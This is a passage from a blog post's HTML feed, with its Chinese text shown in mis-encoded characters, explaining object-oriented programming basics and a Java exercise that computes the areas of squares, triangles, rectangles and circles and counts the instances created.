    <content type="html"><![CDATA[<h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><p><strong>é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ï¼ˆOOPï¼‰ï¼š</strong> ä»¥<strong>å¯¹è±¡</strong>ä¸ºæ ¸å¿ƒçš„ç¨‹åºè®¾è®¡èŒƒå¼ï¼Œå°†ç¨‹åºä¸­çš„æ•°æ®å’Œæ“ä½œçš„æ–¹æ³•<strong>å°è£…</strong>åœ¨ä¸€èµ·ã€‚<br><strong>é¢å‘è¿‡ç¨‹ç¨‹åºè®¾è®¡ï¼ˆPOPï¼‰ï¼š</strong> ä»¥<strong>è¿‡ç¨‹</strong>ä¸ºä¸­å¿ƒçš„ç¨‹åºè®¾è®¡èŒƒå¼ï¼Œå°†ç¨‹åºåˆ†è§£ä¸ºä¸€ç³»åˆ—çš„<strong>å‡½æ•°è°ƒç”¨</strong>ï¼Œæ¯ä¸ªå‡½æ•°å®Œæˆç‰¹å®šåŠŸèƒ½ï¼Œç¨‹åºæ‰§è¡Œé¡ºåºæ˜¯å‡½æ•°çš„é¡ºåºè°ƒç”¨ã€‚<br><strong>åŒºåˆ«ï¼š</strong></p><ul><li><strong>æ ¸å¿ƒä¸åŒï¼š</strong> å‰è€…ä»¥å¯¹è±¡ä¸ºæ ¸å¿ƒï¼Œåè€…ä»¥è¿‡ç¨‹ä¸ºæ ¸å¿ƒã€‚</li><li><strong>ä¾§é‡ç‚¹ä¸åŒï¼š</strong> å‰è€…ä¾§é‡å¯¹è±¡çš„å°è£…å’Œäº¤äº’ï¼Œåè€…ä¾§é‡å‡½æ•°çš„é¡ºåºè°ƒç”¨ã€‚</li><li><strong>ä»£ç å¤ç”¨æ€§ä¸åŒï¼š</strong> å‰è€…é€šè¿‡<strong>ç»§æ‰¿å’Œå¤šæ€</strong>ï¼Œå¤ç”¨æ€§æ›´é«˜ï¼›åè€…é€šè¿‡å‡½æ•°è°ƒç”¨ï¼Œå¤ç”¨æ€§ç›¸å¯¹è¾ƒä½ã€‚</li><li><strong>å¯ç»´æŠ¤æ€§ï¼š</strong> å‰è€…ç¨‹åºç»“æ„æ¸…æ™°ï¼Œå¯ç»´æŠ¤æ€§å¥½ï¼›åè€…ç»“æ„ç›¸å¯¹å¤æ‚ï¼Œéš¾ä»¥ç»´æŠ¤ã€‚</li></ul><p><strong>é¢å‘å¯¹è±¡ä¼˜ç‚¹ï¼š</strong></p><ul><li><strong>å°è£…æ€§ï¼š</strong> å°†ç±»çš„æ•°æ®å’Œå®ç°ç»†èŠ‚å°è£…èµ·æ¥ï¼Œå¯¹å¤–æä¾›ç®€æ´çš„æ¥å£ã€‚</li><li><strong>ç»§æ‰¿æ€§ï¼š</strong> é€šè¿‡ç»§æ‰¿æœºåˆ¶å®ç°ä»£ç çš„å¤ç”¨ã€‚</li><li><strong>å¤šæ€æ€§ï¼š</strong> èƒ½å¤Ÿå®ç°ä¸åŒç±»ä¹‹é—´çš„çµæ´»è½¬æ¢</li><li><strong>å¯ç»´æŠ¤æ€§ï¼š</strong> å°è£…å’Œç»§æ‰¿ä½¿é¢å‘å¯¹è±¡æœ‰è¾ƒé«˜çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</li></ul><p><strong>æŠ½è±¡ï¼š</strong> æŠ½è±¡ä½¿å¯¹ç°å®ä¸–ç•Œä¸­å¤æ‚äº‹ç‰©çš„ç®€åŒ–ä¸æ¦‚æ‹¬ï¼Œé€šè¿‡æŠ½è±¡äº‹ç‰©çš„å…±æ€§å’Œæœ¬è´¨ç‰¹å¾ï¼Œå¿½ç•¥ç»†èŠ‚ï¼Œå½¢æˆä¸€ä¸ªæ›´é€šç”¨çš„æ¨¡å‹ã€‚<br><strong>å°è£…ï¼š</strong> å°†å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•å°è£…åœ¨ä¸€èµ·ï¼Œéšè—å†…éƒ¨ç»†èŠ‚ï¼Œåªæš´éœ²å¿…è¦æ¥å£ã€‚å¯ä¿æŠ¤å¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œé˜²æ­¢å¤–éƒ¨çš„éæ³•è®¿é—®ï¼ŒåŒæ—¶æä¾›ä¸€ä¸ªç®€æ´çš„æ¥å£ä¾›å¤–éƒ¨ä½¿ç”¨ã€‚<br><strong>ç»§æ‰¿ï¼š</strong> ä¸€ç§ä»£ç å¤ç”¨æœºåˆ¶ï¼Œå…è®¸ä¸€ä¸ªå­ç±»ç»§æ‰¿çˆ¶ç±»çš„å±æ€§å’Œæ–¹æ³•ã€‚å­ç±»å¯ä»¥æ‰©å±•æˆ–ä¿®æ”¹çˆ¶ç±»çš„è¡Œä¸ºï¼ŒåŒæ—¶ç»§æ‰¿çˆ¶ç±»çš„å¤šæœ‰éç§æœ‰å±æ€§å’Œæ–¹æ³•ã€‚<br><strong>å¤šæ€ï¼š</strong> å…è®¸ä¸åŒçš„å¯¹è±¡å¯¹åŒä¸€æ¶ˆæ¯åšå‡ºä¸åŒå›åº”ï¼Œå³åŒä¸€ä¸ªæ¥å£å¯ä»¥è¢«ä¸åŒçš„å®ä¾‹ä»¥ä¸åŒçš„æ–¹å¼å®ç°ã€‚å¤šæ€æ€§åˆ†ä¸º <strong>ç¼–è¯‘æ—¶å¤šæ€</strong> å’Œ <strong>è¿è¡Œæ—¶å¤šæ€</strong>ã€‚</p><p><strong>å¯¹è±¡ï¼š</strong> ä¸€ä¸ªè‡ªåŒ…å«çš„å®ä½“ï¼Œç”¨ä¸€ç»„å¯è¯†åˆ«çš„ç‰¹å¾å’Œè¡Œä¸ºæ¥æ ‡è¯†ã€‚<br><strong>ç±»ï¼š</strong> å…·æœ‰ç›¸åŒå±æ€§å’ŒåŠŸèƒ½çš„å¯¹è±¡çš„æŠ½è±¡é›†åˆã€‚<br><strong>ç±»å’Œå¯¹è±¡å…³ç³»ï¼š</strong> å¯¹è±¡æ˜¯ç±»çš„å…·ä½“å®ä¾‹ï¼Œå…·æœ‰ç±»å®šä¹‰çš„å±æ€§å’Œæ–¹æ³•ï¼›ç±»æ˜¯å¯¹è±¡çš„æ¨¡æ¿ï¼Œå®šä¹‰äº†å¯¹è±¡çš„ç»“æ„å’Œè¡Œä¸ºã€‚å¦‚å¯¹äº<code>Person</code>ç±»ï¼Œå®šä¹‰å±æ€§<code>name</code>ã€<code>age</code>å’Œæ–¹æ³•<code>sayHello</code>ï¼Œæ­¤æ—¶å¯é€šè¿‡ç±»æ¥åˆ›å»ºå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person1.name = <span class="hljs-string">&quot;Alice&quot;</span>;<br>        person1.age = <span class="hljs-number">25</span>;<br>        person1.sayHello();            <br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person2.name = <span class="hljs-string">&quot;Bob&quot;</span>;<br>        person2.age = <span class="hljs-number">30</span>;<br>        person2.sayHello();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶<code>person1</code>å’Œ<code>person2</code>å°±æ˜¯ç±»<code>Person</code>çš„å…·ä½“å®ä¾‹ï¼Œå…·æœ‰å…¶çš„å±æ€§å’Œæ–¹æ³•ã€‚<br><strong>ç±»ä¸Cè¯­è¨€ä¸­çš„ç±»å‹çš„ä¸åŒï¼š</strong> </p><ul><li><p>ç±»å«æœ‰æ–¹æ³•ï¼Œç±»å‹ä¸å«æœ‰æ–¹æ³•ã€‚</p></li><li><p>ç±»å­˜å‚¨ç±»å‹å±æ€§å’Œæ–¹æ³•ï¼Œç±»å‹å®šä¹‰å˜é‡å­˜å‚¨æ–¹å¼å’Œå¤§å°ã€‚</p></li><li><p>javaä¸­çš„ç±»æ”¯æŒé¢å‘å¯¹è±¡çš„ç‰¹æ€§ã€‚</p><h2 id="Javaç¨‹åºä¸­çš„ç±»"><a href="#Javaç¨‹åºä¸­çš„ç±»" class="headerlink" title="Javaç¨‹åºä¸­çš„ç±»"></a>Javaç¨‹åºä¸­çš„ç±»</h2></li><li><p><strong>ç³»ç»Ÿå®šä¹‰ç±»ï¼š</strong> å¦‚<code>java.lang,java.util,java.io</code></p></li><li><p><strong>ç”¨æˆ·è‡ªå®šä¹‰ç±»ï¼š</strong> ç¤ºä¾‹å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  String name;<br>  <span class="hljs-type">int</span> age;<br><br>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;Hello! My name is &quot;</span> + name + <span class="hljs-string">&quot; and I am &quot;</span> + age + <span class="hljs-string">&quot; years old.&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br> <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br> person.name = <span class="hljs-string">&quot;Alice&quot;</span>;<br> person.age = <span class="hljs-number">25</span>;<br> person.sayHello();<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="è®¿é—®æ§åˆ¶ç¬¦"><a href="#è®¿é—®æ§åˆ¶ç¬¦" class="headerlink" title="è®¿é—®æ§åˆ¶ç¬¦"></a>è®¿é—®æ§åˆ¶ç¬¦</h2><ul><li><strong>æ¦‚å¿µï¼š</strong> æ˜¯ç”¨äºæ§åˆ¶ç±»ã€ç±»çš„æˆå‘˜ä»¥åŠæ„é€ å‡½æ•°çš„è®¿é—®æƒé™çš„å…³é”®å­—ã€‚å®ƒä»¬å†³å®šäº†å“ªäº›ä»£ç å¯ä»¥è®¿é—®è¿™äº›å…ƒç´ ï¼Œä»è€Œå®ç°å°è£…å’Œä¿¡æ¯éšè—ï¼Œä¿æŠ¤ç±»çš„å†…éƒ¨å®ç°ç»†èŠ‚ã€‚</li><li><strong>ç±»åˆ«</strong>ï¼š<br><code>private</code> <code>default</code> <code>protect</code> <code>public</code></li><li><strong>ä¿®é¥°ç±»ï¼š</strong><br><code>public</code> : ç±»å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è¢«è®¿é—®ã€‚<br><code>default</code> : ç±»åªèƒ½åœ¨åŒä¸€ä¸ªåŒ…å†…è¢«è®¿é—®ã€‚</li><li><strong>ä¿®é¥°åŸŸå’Œæ–¹æ³•ï¼š</strong><br><code>private</code>ï¼šåªèƒ½åœ¨å®šä¹‰çš„ç±»å†…éƒ¨è®¿é—®ã€‚<br><code>default</code>ï¼šåªèƒ½åœ¨åŒä¸€ä¸ªåŒ…å†…è®¿é—®ã€‚<br><code>protected</code>ï¼šå¯åœ¨åŒä¸€ä¸ªåŒ…å†…è®¿é—®ï¼Œä¹Ÿå¯åœ¨åŒ…çš„å­ç±»è®¿é—®ã€‚<br><code>public</code>ï¼šå¯åœ¨ä»»ä½•åœ°æ–¹è®¿é—®ã€‚</li></ul><h1 id="ç¼–ç¨‹è¿ç”¨"><a href="#ç¼–ç¨‹è¿ç”¨" class="headerlink" title="ç¼–ç¨‹è¿ç”¨"></a>ç¼–ç¨‹è¿ç”¨</h1><p>ç¼–ç¨‹å®ç°è®¡ç®—æ­£æ–¹å½¢ã€ä¸‰è§’å½¢ã€çŸ©å½¢åŠåœ†å½¢é¢ç§¯è®¡ç®—åŠŸèƒ½ã€‚</p><h2 id="è¦æ±‚ï¼š"><a href="#è¦æ±‚ï¼š" class="headerlink" title="è¦æ±‚ï¼š"></a><strong>è¦æ±‚ï¼š</strong></h2><p>1ï¼‰å®šä¹‰ä¸¤ä¸ªåŒ…ï¼Œæ‰€æœ‰ç±»å‡ ä½•å½¢ä½“ç±»å®šä¹‰shapeåŒ…ä¸­ï¼Œå«main()æ–¹æ³•çš„ç±»å®šä¹‰åœ¨appåŒ…ä¸­ï¼Œ<br>2ï¼‰</p><ul><li>å®šä¹‰æŠ½è±¡ç±»Shape,åœ¨å…¶ä¸­å®šä¹‰area()æ–¹æ³•è®¡ç®—å¹¶è¾“å‡ºå›¾å½¢é¢ç§¯ï¼›</li><li>å®šä¹‰æ­£æ–¹å½¢ã€ä¸‰è§’å½¢ã€çŸ©å½¢åŠåœ†å½¢ç±»ç»§æ‰¿Shapeç±»ï¼Œå®ç°å„è‡ªçš„é¢ç§¯è®¡ç®—ï¼Œå…¶ä¸­é•¿ã€å®½ã€é«˜ã€åŠå¾„ç­‰åŸºæœ¬å‡ ä½•è¦ç´ è®¾ä¸ºprivateï¼›</li><li>å®šä¹‰å„ç±»å¿…è¦çš„æ„é€ æ–¹æ³•åŠå…¶å®ƒè¾…åŠ©æ–¹æ³•ï¼›</li></ul><p>3ï¼‰å®ç°ä½¿ç”¨é™æ€æˆå‘˜å˜é‡æ¥è®¡ç®—å†…å­˜ä¸­çš„å®ä¾‹åŒ–çš„å„å‡ ä½•å›¾å½¢å¯¹è±¡æ•°ç›®ã€‚</p><h2 id="å®ç°ï¼š"><a href="#å®ç°ï¼š" class="headerlink" title="å®ç°ï¼š"></a><strong>å®ç°ï¼š</strong></h2><p><strong>ç»“æ„</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">/src<br>|<span class="hljs-string">--/app</span><br><span class="hljs-string"></span>|<span class="hljs-string"> </span>|<span class="hljs-string">--Main</span><br><span class="hljs-string"></span>|<br>|<span class="hljs-string">--/shape</span><br><span class="hljs-string"> </span>|<span class="hljs-string">--Square</span><br><span class="hljs-string"> </span>|<span class="hljs-string">--Triangle</span><br><span class="hljs-string"> </span>|<span class="hljs-string">--Rectangle</span><br><span class="hljs-string"> </span>|<span class="hljs-string">--Circle</span><br></code></pre></td></tr></table></figure><p><strong>shape&#x2F;Shapeï¼š</strong> å®šä¹‰æŠ½è±¡ç±»Shapeï¼ŒæŠ½è±¡ç±»åªèƒ½è¢«ç»§æ‰¿ï¼Œä¸èƒ½ç›´æ¥å®ä¾‹åŒ–</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>package shape;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Shape</span>&#123;<br>    <span class="hljs-comment">//å®šä¹‰areaæ–¹æ³•</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-built_in">double</span> <span class="hljs-title">area</span>()</span>;<br><br>    <span class="hljs-comment">//ä½¿ç”¨é™æ€æˆå‘˜å˜é‡è®¡ç®—å®ä¾‹åŒ–çš„å›¾å½¢å¯¹è±¡æ•°ç›®</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">int</span> Count = <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Shape</span>()</span>&#123;<br>        Count++;<br>    &#125;<br>    <span class="hljs-comment">//æä¾›æ¥å£ä»¥è·å–å„å‡ ä½•ä½“å›¾å½¢æ•°ç›®</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">int</span> <span class="hljs-title">ShapeCount</span>()</span>&#123;<br>        <span class="hljs-keyword">return</span> Count;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>shape&#x2F;Squareï¼š</strong> å®šä¹‰ç±»Squareï¼Œè¦†ç›–areaæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> shape;  <br><br><span class="hljs-comment">//ç»§æ‰¿Shapeç±»  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Square</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span>&#123;  <br>    <span class="hljs-comment">//å®šä¹‰è¾¹é•¿  </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> a;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">SquareCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br><br>    <span class="hljs-comment">//æ„é€ æ–¹æ³•  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Square</span><span class="hljs-params">(<span class="hljs-type">float</span> a)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.a = a;  <br>        SquareCount++;  <br>    &#125;  <br>    <span class="hljs-comment">//è¦†ç›–areaæ–¹æ³•  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">area</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> a * a;  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSquareCount</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> SquareCount;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>shape&#x2F;Triangleï¼š</strong> å®šä¹‰Triangleç±»ï¼Œè¦†ç›–areaæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> shape;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Triangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span>&#123;  <br>    <span class="hljs-comment">//å®šä¹‰åº•aï¼Œé«˜h  </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> a,h;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">TriangleCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br><br>    <span class="hljs-comment">//æ„é€ æ–¹æ³•  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Triangle</span><span class="hljs-params">(<span class="hljs-type">float</span> a, <span class="hljs-type">float</span> h)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.a = a;  <br>        <span class="hljs-built_in">this</span>.h = h;  <br>        TriangleCount++;  <br>    &#125;  <br>    <span class="hljs-comment">//è¦†ç›–areaæ–¹æ³•  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">area</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> * a * h;  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getTriangleCount</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span>  TriangleCount;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>shape&#x2F;Rectangleï¼š</strong> å®šä¹‰Rectangleç±»ï¼Œè¦†ç›–areaæ–¹æ³• ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> shape;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span>&#123;  <br>    <span class="hljs-comment">//å®šä¹‰é•¿aï¼Œå®½b  </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> a,b;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">rectangleCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>    <span class="hljs-comment">//æ„é€ æ–¹æ³•  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Rectangle</span><span class="hljs-params">(<span class="hljs-type">float</span> a, <span class="hljs-type">float</span> b)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.a = a;  <br>        <span class="hljs-built_in">this</span>.b = b;  <br>        rectangleCount++;  <br>    &#125;  <br>    <span class="hljs-comment">//è¦†ç›–areaæ–¹æ³•  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">area</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> a * b;  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getRectangleCount</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> rectangleCount;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>shape&#x2F;Circleï¼š</strong> å®šä¹‰Circleç±»ï¼Œè¦†ç›–areaæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> shape;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span>&#123;  <br>    <span class="hljs-comment">//å®šä¹‰åŠå¾„r  </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> r;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">circleCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>    <span class="hljs-comment">//æ„é€ æ–¹æ³•  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Circle</span><span class="hljs-params">(<span class="hljs-type">float</span> r)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.r = r;  <br>        circleCount++;  <br>    &#125;  <br>    <span class="hljs-comment">//è¦†ç›–areaæ–¹æ³•  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">area</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> Math.PI * r * r;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCircleCount</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> circleCount;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>app&#x2F;Mainï¼š</strong> å®šä¹‰Mainç±»ï¼Œå®ç°mainæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> app;  <br><span class="hljs-keyword">import</span> shape.*;<span class="hljs-comment">//å¼•å…¥shapeåŒ…  </span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Square</span>(<span class="hljs-number">4</span>);  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Triangle</span>(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>);  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s2_2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Triangle</span>(<span class="hljs-number">5</span>,<span class="hljs-number">6</span>);  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>(<span class="hljs-number">5</span>,<span class="hljs-number">4</span>);  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s3_2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>);  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s3_3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>(<span class="hljs-number">10</span>,<span class="hljs-number">3</span>);  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>(<span class="hljs-number">7</span>);  <br><br>        System.out.println(<span class="hljs-string">&quot;Square&#x27;s area:&quot;</span>    + s1.area());  <br>        System.out.println(<span 